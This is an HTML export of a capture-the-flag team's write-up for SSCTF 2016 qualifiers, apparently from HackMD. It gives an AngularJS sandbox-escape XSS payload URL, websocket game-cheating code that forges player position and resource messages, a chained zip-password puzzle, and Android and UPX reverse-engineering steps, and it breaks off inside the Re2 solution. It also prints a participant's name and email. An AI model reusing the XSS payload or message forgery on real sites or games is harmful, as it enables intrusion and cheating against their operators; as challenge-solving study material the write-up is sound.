<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    
    <title>
        SSCTF 2016 Quals writeup (team scryptos) - HackMD
    </title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/highlight.js/8.8.0/styles/github-gist.min.css">
    <style>
        .markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.vimeo iframe,.youtube iframe,.youtube img{left:0;top:0;height:100%;position:absolute}.markdown-body{font-size:1pc;line-height:1.6;word-wrap:break-word}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body .absent{color:#c00}.markdown-body .anchor{position:absolute;top:0;bottom:0;left:0;display:block;padding-right:6px;padding-left:30px;margin-left:-30px}.markdown-body .anchor:focus{outline:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:1em;margin-bottom:1pc;font-weight:700;line-height:1.4}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{display:none;color:#000;vertical-align:middle}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{padding-left:8px;margin-left:-30px;line-height:1;text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{display:inline-block}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2.25em;line-height:1.2}.markdown-body h2{font-size:1.75em;line-height:1.225}.markdown-body h3{font-size:1.5em;line-height:1.43}.markdown-body h4{font-size:1.25em}.markdown-body h5{font-size:1em}.markdown-body h6{font-size:1em;color:#777}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:1pc}.markdown-body hr{height:4px;padding:0;margin:1pc 0;background-color:#e7e7e7;border:0}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:1pc}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:1pc;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 1pc;margin-bottom:1pc}.markdown-body blockquote{padding:0 15px;color:#777;border-left:4px solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;-moz-box-sizing:border-box;box-sizing:border-box}.markdown-body .emoji{width:20px;height:20px;max-width:none;margin-bottom:0}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:.2em 0;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\00a0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:0 0;border:0}.markdown-body .highlight{margin-bottom:1pc}.markdown-body .highlight pre,.markdown-body pre{padding:1pc;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:9pt;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important}.markdown-body pre{word-wrap:normal;border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-webkit-inline-flex;display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body .flow-chart,.markdown-body .sequence-diagram,.vimeo,.youtube{text-align:center}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 1pc}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:0 0;padding:0}.ui-user-icon,.vimeo,.youtube{background-position:center center;background-repeat:no-repeat;background-size:contain}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:''}.markdown-body .flow-chart{margin-bottom:40px}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}svg{width:100%;max-height:70vh}.vimeo,.youtube{position:relative;cursor:pointer;display:table;width:100%;background-color:#000;overflow:hidden}.youtube{position:relative;width:100%;padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{width:100%;object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe{width:100%;vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;margin-top:-40px;margin-left:-40px;color:#fff;opacity:.3;-webkit-transition:opacity .2s;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;-webkit-transition:opacity .2s;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}h1:hover .header-link,h2:hover .header-link,h3:hover .header-link,h4:hover .header-link,h5:hover .header-link,h6:hover .header-link{opacity:1;-webkit-transition:opacity .2s ease-in-out .1s;-moz-transition:opacity .2s ease-in-out .1s;-o-transition:opacity .2s ease-in-out .1s;transition:opacity .2s ease-in-out .1s}.header-link{position:relative;left:.5em;right:.5em;opacity:0;font-size:.8em;-webkit-transition:opacity .2s ease-in-out .1s;-moz-transition:opacity .2s ease-in-out .1s;-o-transition:opacity .2s ease-in-out .1s;transition:opacity .2s ease-in-out .1s}.ui-infobar{max-width:758px;margin-top:25px;margin-bottom:-25px;color:#777}.ui-toc{position:fixed;bottom:20px;z-index:10000}.ui-toc-label{opacity:.3;background-color:#ccc;border:none;-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc-dropdown{margin-top:23px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:65vh;overflow:auto;text-align:inherit}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul,.ui-user-icon{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:9pt;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:9pt;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body[lang^=ja]{font-family:"Helvetica Neue",Helvetica,Arial,Meiryo,"MS Gothic","ＭＳ ゴシック",sans-serif}.ui-toc-dropdown[lang^=ja]{font-family:"Source Sans Pro",Helvetica,Arial,"Meiryo UI","MS PGothic","ＭＳ Ｐゴシック",sans-serif}.markdown-body[lang=zh-tw]{font-family:"Helvetica Neue",Helvetica,Arial,"Microsoft JhengHei","微軟正黑",sans-serif}.ui-toc-dropdown[lang=zh-tw]{font-family:"Source Sans Pro",Helvetica,Arial,"Microsoft JhengHei UI","微軟正黑UI",sans-serif}.markdown-body[lang=zh-cn]{font-family:"Helvetica Neue",Helvetica,Arial,"Microsoft YaHei","微软雅黑",sans-serif}.ui-toc-dropdown[lang=zh-cn]{font-family:"Source Sans Pro",Helvetica,Arial,"Microsoft YaHei UI","微软雅黑UI",sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:9pt;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;border-radius:3px;margin-top:2px;margin-bottom:2px;margin-right:5px}.ui-user-icon.small,small .dropdown{display:inline-block}.ui-user-icon.small{width:18px;height:18px;vertical-align:middle;margin:0 0 .2em}small span{line-height:22px}small .dropdown a:focus,small .dropdown a:hover{text-decoration:none}.unselectable{-moz-user-select:none;-khtml-user-select:none;-webkit-user-select:none;-o-user-select:none;user-select:none}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:9pt!important}}@font-face{font-family:'Source Code Pro';font-style:normal;font-weight:300;src:local('Source Code Pro Light'),local('SourceCodePro-Light'),url(https://fonts.gstatic.com/s/sourcecodepro/v6/leqv3v-yTsJNC7nFznSMqUBls_1aQwi4AfipSOlE3SU.ttf) format('truetype')}@font-face{font-family:'Source Code Pro';font-style:normal;font-weight:400;src:local('Source Code Pro'),local('SourceCodePro-Regular'),url(https://fonts.gstatic.com/s/sourcecodepro/v6/mrl8jkM18OlOQN8JLgasD1zCdIATDt8zXO3QNtzVeJ8.ttf) format('truetype')}@font-face{font-family:'Source Code Pro';font-style:normal;font-weight:500;src:local('Source Code Pro Medium'),local('SourceCodePro-Medium'),url(https://fonts.gstatic.com/s/sourcecodepro/v6/leqv3v-yTsJNC7nFznSMqdgxThF69EFTxeh70dQtJtE.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:normal;font-weight:300;src:local('Source Sans Pro Light'),local('SourceSansPro-Light'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/toadOcfmlt9b38dHJxOBGEBls_1aQwi4AfipSOlE3SU.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:normal;font-weight:400;src:local('Source Sans Pro'),local('SourceSansPro-Regular'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/ODelI1aHBYDBqgeIAH2zlFzCdIATDt8zXO3QNtzVeJ8.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:normal;font-weight:600;src:local('Source Sans Pro Semibold'),local('SourceSansPro-Semibold'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/toadOcfmlt9b38dHJxOBGGvd-IutAbwf5FQ8ZpuI2w4.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:italic;font-weight:300;src:local('Source Sans Pro Light Italic'),local('SourceSansPro-LightIt'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/fpTVHK8qsXbIeTHTrnQH6I48KljrVa8Zcyi9xGGohEU.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:italic;font-weight:400;src:local('Source Sans Pro Italic'),local('SourceSansPro-It'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/M2Jd71oPJhLKp0zdtTvoM6xot8ENfkYez2Lz7rcrw70.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:italic;font-weight:600;src:local('Source Sans Pro Semibold Italic'),local('SourceSansPro-SemiboldIt'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/fpTVHK8qsXbIeTHTrnQH6KjMMkbXdLGS8FpAnMJn5J0.ttf) format('truetype')}@font-face{font-family:'Source Serif Pro';font-style:normal;font-weight:400;src:local('Source Serif Pro'),local('SourceSerifPro-Regular'),url(https://fonts.gstatic.com/s/sourceserifpro/v4/CeUM4np2c42DV49nanp55WdjwOOpWxWrsXXkZJyNRnI.ttf) format('truetype')}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:1px 1px 1px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;font-family:"Source Sans Pro",Helvetica,Arial,sans-serif;letter-spacing:.025em}:focus{outline:0!important}::-moz-focus-inner{border:0!important}body.modal-open{overflow-y:auto;padding-right:0!important}

    </style>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    	<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.2.0/es5-shim.min.js"></script>
    <![endif]-->
</head>

<body>
    <div id="doc" class="markdown-body container-fluid"><h1 id="ssctf-2016-quals-writeup-team-scryptos">SSCTF 2016 Quals writeup (team scryptos)<a class="header-link hidden-xs" href="#ssctf-2016-quals-writeup-team-scryptos" title="ssctf-2016-quals-writeup-team-scryptos"><span class="sr-only"></span><i class="fa fa-link"></i></a></h1><h2 id="can-you-hit-me-web-200">Can You Hit Me? - web 200<a class="header-link hidden-xs" href="#can-you-hit-me-web-200" title="can-you-hit-me-web-200"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><p>Angular XSS.</p><p>payload: <code>http://960a23aa.seclover.com/index.php?xss={{%27a%27.coonnstructor.prototype.charAt=[].join;$evevalal(%27x=alealertrt(1)%27);}}</code></p><pre><code>SSCTF{4c138226180306f21ceb7e7ed1158f08}
---- 原始邮件 ----
From:"Ikumi Shimizu"&lt;193sim@gmail.com&gt;;
Date:2016年2月27日(星期六) 中午12:03
To:"ctf"&lt;ctf@seclover.com&gt;;
Subject:Web02-193sim@gmail.com-scryptos
</code></pre><p>flag: <code>4c138226180306f21ceb7e7ed1158f08</code></p><h2 id="hungry-game-misc-300">Hungry Game - misc 300<a class="header-link hidden-xs" href="#hungry-game-misc-300" title="hungry-game-misc-300"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><h3 id="the-challenge">The challenge<a class="header-link hidden-xs" href="#the-challenge" title="the-challenge"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>The challenge was about online game cheating.<br>
This game uses websocket for communicating with game server. The game is quite simple. As the log panel says, use arrow keys to move around, and pushing space key makes special action. the door takes me to the next stage.</p><p>If you don’t move for a while, you’ll be kicked with the following message: “Timeout!Finish in 5 minutes.”<br>
and this game is a little buggy, sometimes I got kicked for inexplicable reason.</p><p>Well, it’s time to automate the game. I just cloned index.html and game.js, and hosted them locally.<br>
Now everything can be done by replacing <code>game.js</code>. Filling username/password with no user interaction, logging useful information, overwrite javascript variables used in the game, sending data to the game server, … everything.<br>
<a href="http://i.imgur.com/nlJ74T8.png" target="_blank"><img src="http://i.imgur.com/nlJ74T8.png" alt="" id="exifviewer-img-23" exifid="1230669342" oldsrc="http://i.imgur.com/nlJ74T8.png"></a></p><h3 id="jumping-over-the-wall">jumping over the wall<a class="header-link hidden-xs" href="#jumping-over-the-wall" title="jumping-over-the-wall"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>Reading the source code, I discovered that what we’re sending to the game server is just a position of the player, not a direction.<br>
<code>users[heroname]</code> gives you information about your position, so overwriting this variable goes well.</p><p><a href="http://i.imgur.com/dT3H9Tb.png" target="_blank"><img src="http://i.imgur.com/dT3H9Tb.png" alt="" id="exifviewer-img-19" exifid="-355115954" oldsrc="http://i.imgur.com/dT3H9Tb.png"></a></p><h3 id="cutting-trees">cutting trees<a class="header-link hidden-xs" href="#cutting-trees" title="cutting-trees"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><pre><code class="javascript hljs">data = <span class="hljs-built_in">JSON</span>.stringify([msg(<span class="hljs-string">'wood'</span>, {
    <span class="hljs-string">'time'</span>: tmp
})]);
ws.send(data);
</code></pre><p>There’s no rate limit here, so I simplly sent <code>wood</code> message with bigger <code>time</code> parameter.<br>
<code>ws.send(JSON.stringify([msg('wood', {'time':1145141919810})]);</code></p><h3 id="mining-diamonds">mining diamonds<a class="header-link hidden-xs" href="#mining-diamonds" title="mining-diamonds"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><pre><code class="javascirpt hljs"><span class="hljs-keyword">if</span> (diamondtimes &gt; <span class="hljs-number">0</span>) {
    data = <span class="hljs-built_in">JSON</span>.stringify([msg(<span class="hljs-string">'diamond'</span>, {
        <span class="hljs-string">'count'</span>: diamondtimes
    })]);
    ws.send(data);
}
</code></pre><p>It seemed to be same as the previous one, but this time, there’s rate limit. (you’ll get kicked if you exceeded)<br>
Sending 50 diamonds every 100ms was barely OK, so I did.</p><h3 id="boss-battle">Boss battle<a class="header-link hidden-xs" href="#boss-battle" title="boss-battle"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p><a href="http://i.imgur.com/zk7oxnI.png" target="_blank"><img src="http://i.imgur.com/zk7oxnI.png" alt="" id="exifviewer-img-24" exifid="-797043610" oldsrc="http://i.imgur.com/zk7oxnI.png"></a><br>
As the log panel says, we should be close to the boss in order to damage the boss. Looking at the source code, I discovered that we are sending player’s position as a parameter of <code>attack</code> message. changing it to the boss’s position worked well. corners are a little safer because the boss moves around randomly.</p><pre><code class="javascirpt hljs">data = <span class="hljs-built_in">JSON</span>.stringify([msg(<span class="hljs-string">'attack'</span>, {
    <span class="hljs-string">'x'</span>: users[heroname].x,
    <span class="hljs-string">'y'</span>: users[heroname].y
})]);
ws.send(data);
</code></pre><pre><code>Attacked by boss
Attack:boss,total 9
Attack:boss,total 10
Attack:boss,total 11
Attack:boss,total 12
Attack:boss,total 13
Attack:boss,total 14
Attack:boss,total 15
SSCTF{2b6073f30631b4748643a7fcc37a3aa8}
Attack:boss,total 16
Attack:boss,total 17
Attacked by boss
Attack:boss,total 18
...
...
Attacked by boss
Attack:boss,total 41
Killed by boss
</code></pre><p>here’s the modified source code:  <a href="https://gist.github.com/cd9db6e299b6f2d5bd93" target="_blank">https://gist.github.com/cd9db6e299b6f2d5bd93</a><br>
flag: <code>2b6073f30631b4748643a7fcc37a3aa8</code></p><h2 id="chain-rule-crypto-200">Chain Rule - crypto 200<a class="header-link hidden-xs" href="#chain-rule-crypto-200" title="chain-rule-crypto-200"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><p>coding challenge.</p><p>513 encrypted zip files are given. one of them was decryptable with password <code>start</code>, and another one’s password was written in the file of previous zip file, … repeating this, I got two important files, <code>pwd.zip</code> and <code>flag.zip</code>.<br>
extracting <code>pwd.zip</code>, I got 6410 plain text files.  the contents of them are like this: <code>next is 127369</code>, except <code>376831.txt</code>.</p><pre><code>376831.txt:Follow the path, collect the comments. Avoid the BLACKHOLE!
</code></pre><p>As the challenge description said, pwd.zip has 1-byte comments for each files, <code>\t</code> and <code>\x20</code>. I followed path from 376831.txt to start.txt, and concatenated their comments with appropriate order. Replacing <code>\x20</code>/<code>\t</code> into <code>1</code>/<code>0</code> (and convert this bit sequence to bytes) gave me the following text:</p><pre><code>When I am dead, my dearest,
Sing no sad songs for me;
Plant thou no roses at my head,
Nor shady cypress tree:
Be the green grass above me
With showers and dewdrops wet:
And if thou wilt, remember,
And if thou wilt, forget.

password part1:Thispasswordistoolong

I shall not see the shadows,
I shall not see the rain;
I shall not hear the nightingle
Sing on as if in pain:
And dreaming through the twilight
That doth not rise nor set,
Haply I may remember,
And haply I may forget.

password part2:andyoudon'twanttocrackitbybruteforce

That's all.
</code></pre><p><code>Thispasswordistoolongandyoudon'twanttocrackitbybruteforce</code> was the password for flag.zip</p><p>path: <a href="https://gist.github.com/ebccaff5b14b025c4400" target="_blank">https://gist.github.com/ebccaff5b14b025c4400</a><br>
solver: <a href="https://gist.github.com/68b0cd8708c70c6c8b7d" target="_blank">https://gist.github.com/68b0cd8708c70c6c8b7d</a></p><p>flag: <code>Somewhere_Over_The_Rainbow</code></p><h2 id="re1-reverse-100">Re1 - reverse 100<a class="header-link hidden-xs" href="#re1-reverse-100" title="re1-reverse-100"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><p>This challenge was about analyzing Android app.<br>
This app has two textboxes, “txt_user” and "txt_no", and do some checks like this:</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span></div><div class="code"><span class="hljs-keyword">if</span> txt_user == <span class="hljs-string">"secl-007"</span> &amp;&amp; getpl(some_function(), txt_no) != <span class="hljs-number">0</span>:
    <span class="hljs-comment"># the input are OK</span>
<span class="hljs-keyword">else</span>:
    <span class="hljs-comment"># the input are wrong</span>
</div></div></code></pre><p>The function <code>getpl</code> is defined in libplokm.so, so we also have to analyze this binary.</p><pre><code class="clike hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span></div><div class="code"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getpl</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *some_key, <span class="hljs-keyword">char</span> *our_input)</span></span>{
    <span class="hljs-keyword">char</span> str[];
    <span class="hljs-keyword">char</span> result[];
    
    <span class="hljs-comment">// generate a string from some_key and store it to str</span>

    <span class="hljs-built_in">strcat</span>(result, <span class="hljs-string">"SSCTF{"</span>);
    <span class="hljs-built_in">strcat</span>(result, str);
    <span class="hljs-built_in">strcat</span>(result, <span class="hljs-string">"}"</span>);
    
    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(result, our_input)){
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}
</div></div></code></pre><p><code>getpl</code> recovers the flag, then compare it with our input.<br>
This means that we can find the flag from Android’s memory regardless of the input are correct.<br>
So I launched Genymotion and the Android app, typed “secl-007” and “blabla” to txt_user and txt_no, searched for strings starting with "SSCTF{" from Android's memory, and found "SSCTF{oty3eaP$g986iwhw32j%OJ)g0o7J.CG:}".<br>
flag: <code>oty3eaP$g986iwhw32j%OJ)g0o7J.CG:</code></p><h2 id="re2-reverse-200">Re2 - reverse 200<a class="header-link hidden-xs" href="#re2-reverse-200" title="re2-reverse-200"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><p>The challenge was about analyzing PE32.<br>
This program is packed by UPX, so I first unpack.<br>
And I analyzed this program with IDA demo version.<br>
According to its result, I can get flag by following script.</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
